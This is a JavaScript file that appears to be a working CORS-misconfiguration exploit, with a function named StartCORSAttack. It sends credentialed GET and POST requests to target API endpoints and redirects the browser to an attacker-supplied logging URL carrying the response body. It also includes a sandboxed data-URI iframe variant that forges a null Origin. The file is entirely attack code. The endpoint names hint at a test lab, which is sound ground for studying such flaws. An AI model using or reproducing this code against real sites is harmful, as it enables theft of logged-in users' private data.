function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}

function CreateCORSForm(url, type, logurl, page){
    var url = url + "/" + page
    var div = document.createElement("p");
    div.setAttribute("id", "P_"+type+page)

    var input = document.createElement("input");
    input.setAttribute("id", type+page+'Button');
    input.setAttribute("class", "form-check-input")
    input.setAttribute("type", "checkbox");

    var label = document.createElement("label");
    label.setAttribute("class", "form-check-label")
    label.setAttribute("for", type+page+'Button')
    label.innerHTML = "Send " + type + " request to " + page

    div.appendChild(input);
    div.appendChild(label);

    document.getElementsByTagName("body")[0].appendChild(div);

    button = document.querySelector('#'+type+page+'Button');
    button.addEventListener('click', CorsReq, false);
    
    button.url = url;
    button.logurl = logurl;
    button.reqtype = type;

    return 1;
}

function CorsReq(evt){
    var url = evt.currentTarget.url;
    var type = evt.currentTarget.reqtype;
    var logurl = evt.currentTarget.logurl;
    alert(url, type, logurl);

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open(type, url, true);

    req.withCredentials = true;
    req.send();

    function reqListener() {
        location=logurl+'?key='+this.responseText;
    };
}




function CorsNullReq(url, type, logurl, page){
    function innerIframe(evt){
        var url = evt.currentTarget.url;
        var type = evt.currentTarget.reqtype;
        var logurl = evt.currentTarget.logurl;
        var page = evt.currentTarget.page;
        console.log(url);
        var elem = document.querySelector('#'+type+page+'ButtonNullP');
        elem.innerHTML = `
            <iframe class="mt-2" style="background: #F5F5F5;" sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('${type}','${url}',true);
            req.withCredentials = true;
            req.send();

            function reqListener() { 
                location='${logurl}?key='+this.responseText;
            };
            </script>">
            </iframe>`;

    } 
    var url = url + "/" + page
    
    var div = document.createElement("p");
    div.setAttribute("id", "iframediv_"+page+type)

    var input = document.createElement("input");
    input.setAttribute("id", type+page+'ButtonNull');
    input.setAttribute("class", "form-check-input")
    input.setAttribute("type", "checkbox");

    var label = document.createElement("label");
    label.setAttribute("class", "form-check-label")
    label.setAttribute("for", type+page+'ButtonNull')
    label.innerHTML = "Send " + type + " request to " + page + "[NULL]"

    var p = document.createElement("p")
    p.setAttribute("id", type+page+'ButtonNullP');


    div.appendChild(input);
    div.appendChild(label);
    div.appendChild(p);

    document.getElementsByTagName("body")[0].appendChild(div);

    button = document.querySelector('#'+type+page+'ButtonNull');
    button.addEventListener('click', innerIframe, false);
    
    button.url = url;
    button.logurl = logurl;
    button.reqtype = type;
    button.page = page;
}


function CreateCommonDiv(methods, pages){
    var DivMain = document.createElement("div");
    DivMain.setAttribute("id", "AllForms")
    DivMain.setAttribute("class", "form-check ms-5 ps-5")

    for (let i = 0; i < methods.length; i += 1) {
        var div = document.createElement("div");
        div.setAttribute("id", methods[i]+"Forms")

        for (let j = 0; j < pages.length; j += 1) {
            form = document.getElementById("P_"+methods[i]+pages[j]);
            iframe = document.getElementById("iframediv_"+pages[j]+methods[i]);
            div.appendChild(form);
            div.appendChild(iframe);
        }
        DivMain.appendChild(div)
        
    }
    document.getElementsByTagName("body")[0].appendChild(DivMain);
}

function StartCORSAttack(url, logurl){
    var methods = ["GET", "POST"];
    var pages = ["api_correct", "api_null", "api_gen"]
    
    
    for (let i = 0; i < methods.length; i += 1) {
        for (let j = 0; j < pages.length; j += 1) {
            if(CreateCORSForm(url, methods[i], logurl, pages[j])){
                console.log("[+] Successfully created CORS forms!");
            };
            if(CorsNullReq(url, methods[i], logurl, pages[j])){
                console.log("[+] Successfully created CORS NULL iframes")
            }   
    
        }
    }

    CreateCommonDiv(methods, pages);
    
}

